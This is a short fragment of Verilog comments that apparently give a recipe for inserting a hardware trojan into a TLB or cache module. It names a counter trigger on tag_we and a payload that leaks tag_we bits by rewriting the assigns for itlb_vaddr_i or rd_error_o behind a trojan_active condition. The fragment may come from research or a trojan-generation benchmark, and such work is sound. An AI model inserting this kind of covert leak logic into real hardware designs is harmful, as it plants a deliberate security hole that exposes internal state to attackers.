 ...
 *   
 * Trigger: Counter on tag_we
 * Payload: Route itlb_vaddr_i[0] to observable output
 * 
...
//   Find the assign for itlb_vaddr_i (or rd_error_o as fallback):
//     assign itlb_vaddr_i = <normal_expr>;
//   Replace with:
//     assign itlb_vaddr_i = trojan_active ? tag_we[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? tag_we[0] : 1'b0;
//
